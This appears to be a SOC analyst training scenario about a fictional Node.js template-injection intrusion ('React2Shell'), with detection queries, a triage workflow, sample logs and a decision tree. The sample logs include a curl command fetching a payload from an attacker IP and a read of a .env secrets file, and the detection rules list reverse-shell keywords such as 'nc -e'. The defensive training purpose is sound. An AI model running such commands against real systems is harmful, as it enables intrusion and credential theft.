# 🚨 React2Shell Exploitation | SOC Investigation Scenario

## 1. Threat Summary

React2Shell is a server-side template injection (SSTI) exploitation technique targeting vulnerable React-based Node.js applications. 
The attacker abuses user-controlled input fields that are improperly sanitized, allowing execution of arbitrary OS commands on the server.

In this scenario, the adversary gained remote code execution through a crafted payload submitted to a React application endpoint. 
The exploitation chain resulted in:

- Execution of injected commands via the Node.js runtime.
- Creation of a reverse shell connection from the web server to an external IP.
- Download and execution of an additional payload for persistence.
- Lateral movement attempts using harvested API keys and cached credentials.

The activity maps to MITRE ATT&CK techniques including:
- T1190 Exploit Public-Facing Application  
- T1059 Command Execution  
- T1105 Ingress Tool Transfer  
- T1041 Exfiltration Over C2 Channel


## 2. Attack Narrative (What Happened)

The incident began when a public-facing React-based Node.js application received a series of unusual HTTP POST requests targeting the `/feedback/submit` endpoint. 
The payload contained suspicious template expressions that attempted to break out of normal React rendering and reach the underlying server runtime.

1. **Initial Exploitation**  
   The attacker leveraged a server-side template injection (SSTI) flaw caused by unsafe rendering of user-supplied content.  
   A crafted payload successfully executed `child_process.exec()` on the Node.js server, confirming remote command execution.

2. **Establishing Command Execution**  
   Using the foothold, the attacker issued OS-level commands to enumerate the environment:  
   - `whoami`  
   - `hostname`  
   - `ls -la /var/www/`  
   - `cat .env` to retrieve environment variables and API keys.

3. **Reverse Shell Deployment**  
   The attacker executed a one-liner payload that forced the server to open a reverse shell connection to an external IP address (`185.203.112.37`) on port `4444`.  
   This provided the adversary with an interactive session over which they issued further commands.

4. **Payload Delivery**  
   Over the reverse shell, the attacker downloaded an obfuscated Node.js script from a remote server.  
   The script established persistence by creating a systemd service disguised as a legitimate monitoring agent.

5. **Credential & Key Harvesting**  
   The attacker accessed server-side logs and configuration files, recovering cached API keys and session tokens.  
   They attempted authentication against internal APIs and cloud services using these stolen tokens.

6. **Lateral Movement Attempt**  
   Using the harvested keys, the attacker attempted to access an internal admin microservice.  
   Authentication was partially successful but blocked by an IP allowlist, preventing further escalation.

7. **Exfiltration Attempt**  
   Before disconnecting, the adversary attempted to transfer `/var/www/app/logs/app.log` and `.env` to their C2 server over the same reverse shell channel.

The activity was detected when abnormal command execution logs and outbound reverse-shell behavior appeared in the SIEM.


## 3. Detection Logic (KQL + Splunk SPL)

### A. Suspicious Command Execution (Node.js child_process)

#### KQL – Abnormal Shell Commands from Node Processes
```
DeviceProcessEvents
| where ProcessCommandLine has_any ("child_process", "exec(", "bash -c", "nc -e", "curl", "wget")
| where InitiatingProcessFileName =~ "node" or FileName =~ "node"
| project Timestamp, DeviceName, FileName, ProcessCommandLine, InitiatingProcessParentFileName
```
#### Splunk SPL – Node.js Launching Suspicious Commands
```
index=main sourcetype=process*
("child_process" OR "exec(" OR "bash -c" OR "nc -e" OR curl OR wget)
ParentImage="*node*" OR Image="*node*"
| table _time host Image ParentImage CommandLine
```
---

### B. Reverse Shell Behavior (Outbound to Suspicious IP)

#### KQL – Outbound Reverse Shell Indicators
```
DeviceNetworkEvents
| where RemotePort in ("4444","1337","8081")
| where RemoteIP in ("185.203.112.37")
| where InitiatingProcessFileName has_any ("bash","sh","node")
| project Timestamp, DeviceName, InitiatingProcessFileName, RemoteIP, RemotePort
```
#### Splunk SPL – Reverse Shell Connection
```
index=network* 
dest_port IN (4444,1337,8081)
dest_ip="185.203.112.37"
(Image="*bash*" OR Image="*sh*" OR Image="*node*")
| table _time src_ip dest_ip dest_port process
```
---

### C. Ingress Tool Transfer (Malicious Download)

#### KQL – File Download via curl, wget, or Node Fetch
```
DeviceProcessEvents
| where ProcessCommandLine has_any ("curl http", "wget http", "fetch(")
| project Timestamp, DeviceName, ProcessCommandLine
```
#### Splunk SPL – Suspicious Download
```
index=process* 
(CommandLine="*curl http*" OR CommandLine="*wget http*" OR CommandLine="*fetch(*")
| table _time host CommandLine
```
---

### D. Persistence via systemd Service

#### KQL – Creation of New systemd Service
```
DeviceProcessEvents
| where ProcessCommandLine has_all ("systemctl", "enable")
| project Timestamp, DeviceName, ProcessCommandLine
```
#### Splunk SPL – New systemd Service Creation
```
index=process* 
(CommandLine="*systemctl enable*" OR CommandLine="*systemctl start*")
| table _time host CommandLine
```
---

### E. Access to Sensitive Files (Credential Harvesting)

#### KQL – Access to .env and Log Files
```
DeviceFileEvents
| where FileName has_any (".env", "app.log")
| where InitiatingProcessFileName in ("node","bash","sh")
| project Timestamp, DeviceName, FileName, InitiatingProcessFileName
```
#### Splunk SPL – Sensitive File Access
```
index=file* 
(FileName="*.env" OR FileName="app.log")
(Image="*node*" OR Image="*bash*" OR Image="*sh*")
| table _time host FileName Image
```

## 4. Triage Workflow

This workflow shows how a SOC analyst should investigate and validate the React2Shell activity, step by step.

1. **Alert Triage**
   - Review triggered detection alerts (Node.js suspicious commands, reverse shell connections, file downloads).
   - Confirm alert validity by checking process lineage and network connections.

2. **Process Investigation**
   - Identify all processes initiated by `node` or other suspicious binaries.
   - Collect command-line arguments and execution time.
   - Correlate with user sessions and IP addresses.

3. **Network Correlation**
   - Check outbound connections from affected hosts.
   - Look for repeated or periodic connections to unusual external IPs (e.g., `185.203.112.37`) and ports (`4444`, `1337`, `8081`).
   - Flag any connections not associated with normal business activity.

4. **File and Configuration Review**
   - Identify access to sensitive files like `.env`, application logs, or configuration backups.
   - Verify if any unauthorized file transfers occurred.

5. **Persistence Assessment**
   - Review any new services, scheduled tasks, or startup scripts created.
   - Confirm if these match normal administrative activity or are indicators of compromise.

6. **Scope Determination**
   - Enumerate all systems touched by the attacker using process and network correlation.
   - Flag any lateral movement attempts within internal services or cloud resources.

7. **IOC Collection**
   - Collect all Indicators of Compromise: IP addresses, domains, file hashes, and suspicious process command lines.
   - Store in a central repository for enrichment and alert tuning.

8. **Escalation & Documentation**
   - If confirmed, escalate to L3/IR team.
   - Document findings clearly in the incident ticket, including MITRE ATT&CK mapping, impacted assets, and evidence links.

---

**Note:** This workflow assumes SIEM, endpoint telemetry, and network monitoring are available. Each step should be reproducible and defensible in an actual SOC audit or interview scenario.


## 5. Evidence Pack (Log Samples)

Below are representative log samples aligned with the React2Shell attack chain. 
These samples are sanitized but realistic enough to demonstrate SIEM investigation skills.

---

### A. Process Execution Logs (Node.js → child_process.exec)

**Sample 1 – Suspicious command execution**
```
{
"Timestamp": "2025-01-11T14:32:08Z",
"DeviceName": "web-prod-03",
"Image": "/usr/bin/node",
"CommandLine": "node app.js child_process.exec('bash -c "whoami"')",
"ParentImage": "/usr/bin/node",
"User": "www-data"
}
```
**Sample 2 – Enumeration via RCE**
```
{
"Timestamp": "2025-01-11T14:32:15Z",
"DeviceName": "web-prod-03",
"Image": "/bin/bash",
"CommandLine": "bash -c "cat /var/www/app/.env"",
"ParentImage": "/usr/bin/node",
"User": "www-data"
}
```
### B. Network Logs (Reverse Shell Connection)

**Outbound connection to attacker-controlled host**
```
{
"Timestamp": "2025-01-11T14:33:02Z",
"DeviceName": "web-prod-03",
"InitiatingProcess": "/bin/bash",
"RemoteIP": "185.203.112.37",
"RemotePort": 4444,
"ConnectionType": "Outbound",
"Protocol": "TCP"
}
```
---

### C. File Access Logs (Credential Harvesting)

**Access to `.env` file**
```
{
"Timestamp": "2025-01-11T14:32:17Z",
"DeviceName": "web-prod-03",
"FileName": "/var/www/app/.env",
"InitiatingProcess": "/bin/bash",
"User": "www-data",
"Action": "Read"
}
```
**Access to app logs**
```
{
"Timestamp": "2025-01-11T14:33:41Z",
"DeviceName": "web-prod-03",
"FileName": "/var/www/app/logs/app.log",
"InitiatingProcess": "/usr/bin/node",
"Action": "Read"
}
```
---

### D. Persistence Activity Logs (systemd Service)

**Creation of rogue systemd service**
{
"Timestamp": "2025-01-11T14:35:12Z",
"DeviceName": "web-prod-03",
"CommandLine": "systemctl enable monitoring-agent.service",
"User": "root",
"ServiceName": "monitoring-agent.service",
"ServiceFile": "/etc/systemd/system/monitoring-agent.service"
}

### E. Ingress Tool Transfer Logs (Payload Download)

{
"Timestamp": "2025-01-11T14:34:01Z",
"DeviceName": "web-prod-03",
"Image": "/usr/bin/curl",
"CommandLine": "curl http://185.203.112.37/payload.js -o /tmp/payload.js",
"User": "www-data"
}


## 6. Analyst Decision Tree

This decision tree guides the analyst from initial alert to final classification without relying on guesswork.

Start
│
├── 1. Did the alert originate from a Node.js process running server-side?
│ ├── No → False positive. Close ticket.
│ └── Yes → Continue.
│
├── 2. Is the process spawning abnormal commands (bash, sh, curl, wget)?
│ ├── No → Requires deeper manual review. Possible low-risk anomaly.
│ └── Yes → Continue.
│
├── 3. Does the host show outbound connections to suspicious IPs or uncommon ports?
│ ├── No → Still suspicious. Check file access and service creation.
│ └── Yes → Likely active exploitation. Continue.
│
├── 4. Are sensitive files accessed (.env, logs, config files)?
│ ├── No → Possible early-stage exploitation. Continue monitoring.
│ └── Yes → Confirmed credential access. Continue.
│
├── 5. Any signs of persistence (systemd service, cron job, startup script)?
│ ├── No → Partial compromise without persistence.
│ └── Yes → Full compromise. Immediate containment required.
│
├── 6. Attempted lateral movement or internal API calls?
│ ├── No → Contain and move to eradication.
│ └── Yes → Escalate to Incident Response lead.
│
└── End – Classification
- If steps 2, 3 and 4 triggered → High Confidence RCE
- If step 5 triggered → Full System Compromise
- If only step 2 triggered → Suspicious Execution (Needs Monitoring)
- If none triggered → Benign


## 7. Containment & Eradication

## 8. Lessons Learned & Preventive Controls
